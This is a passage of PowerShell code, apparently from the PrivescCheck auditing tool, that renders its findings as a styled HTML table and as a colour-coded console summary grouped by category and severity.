    text-align:center;
    padding:5px 5px 5px 5px;
}

tbody td:nth-child(3) {
    text-align:left;
}

/* Render output results with 'pre' style */
tbody td:nth-child(6) {
    white-space: pre;
    margin: 1em 0px;
    padding: .2rem .4rem;
    font-size: 87.5%;
    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
    text-align:left;
}

tbody tr:nth-child(even) {
    background:#ECF0F1;
}

tbody tr:hover {
    background:#BDC3C7;
    color:#FFFFFF;
}

.scroll {
    max-height: 200px;
    overflow: auto;
}

.label {
    margin: 8px;
    padding: 6px;
    display: block;
    width: 60px;
    border-radius: 5px;
}

.bg_green {background-color: #4CAF50;} /* Green */
.bg_blue {background-color: #2196F3;} /* Blue */
.bg_orange {background-color: #ff9800;} /* Orange */
.bg_red {background-color: #f44336;} /* Red */
.bg_grey {background-color: #cccccc;} /* Gray */
"@

    $Html = @"
<html>
<head>
<style>
$($Css)
</style>
</head>
<body>
BODY_TO_REPLACE
<script>
$($JavaScript)
</script>
</body>
</html>
"@

    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment
    $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
    $Html
}

function Get-SeverityColor {

    param (
        [ValidateSet("Info","Low","Medium","High")]
        [string] $Severity
    )

    switch ($Severity) {
        "Info"      { "DarkCyan" }
        "Low"       { "DarkGreen" }
        "Medium"    { "Yellow" }
        "High"      { "Red" }
    }
}

function Write-ShortReport {

    [CmdletBinding()] param()

    $HeavyVertical = [char] 0x2503
    # $HeavyVerticalAndRight = [char] 0x2523
    # $HeavyVerticalAndLeft = [char] 0x252B
    $HeavyHorizontal = [char] 0x2501
    # $HeavyDownAndHorizontal = [char] 0x2533
    # $HeavyUpAndHorizontal = [char] 0x253B
    $HeavyDownAndLeft = [char] 0x2513
    $HeavyDownAndRight = [char] 0x250F
    $HeavyUpAndRight = [char] 0x2517
    $HeavyUpAndLeft = [char] 0x251B
    $RightwardsArrow = [char] 0x2192

    Write-Host -ForegroundColor White "$($HeavyDownAndRight)$("$HeavyHorizontal" * 62)$($HeavyDownAndLeft)"
    Write-Host -ForegroundColor White "$($HeavyVertical)$(" " * 17)~~~ PrivescCheck Summary ~~~$(" " * 17)$($HeavyVertical)"
    Write-Host -ForegroundColor White "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"

    # Show only vulnerabilities, i.e. any finding that has a final severity of at 
    # least "low".
    $AllVulnerabilities = $ResultArrayList | Where-Object { $_.Severity -ne "Info" -and $_.Severity -ne "None" }
    $Categories = $AllVulnerabilities | Select-Object -ExpandProperty "Category" | Sort-Object -Unique

    if ($null -eq $AllVulnerabilities) {
        Write-Host -ForegroundColor White "No vulnerability found!"
        return
    }

    foreach ($Category in $Categories) {

        $SeveritySort = "High", "Medium", "Low"
        $Vulnerabilities = $AllVulnerabilities | Where-Object { $_.Category -eq $Category } | Sort-Object { $SeveritySort.IndexOf($_.Severity) }

        Write-Host -ForegroundColor White " $($Category)"

        foreach ($Vulnerability in $Vulnerabilities) {

            $SeverityColor = Get-SeverityColor -Severity $Vulnerability.Severity
            $FindingCount = $(([Object[]]$Vulnerability.ResultRaw).Length)

            Write-Host -NoNewline -ForegroundColor White " -"
            Write-Host -NoNewLine " $($Vulnerability.DisplayName) $($RightwardsArrow)"
            Write-Host -NoNewline -ForegroundColor $SeverityColor " $($Vulnerability.Severity)"
            Write-Host -NoNewLine " ($($FindingCount) finding"
            Write-Host $(if ($FindingCount -gt 1) { "s)" } else { ")" })
        }
    }

    Write-Host ""
}
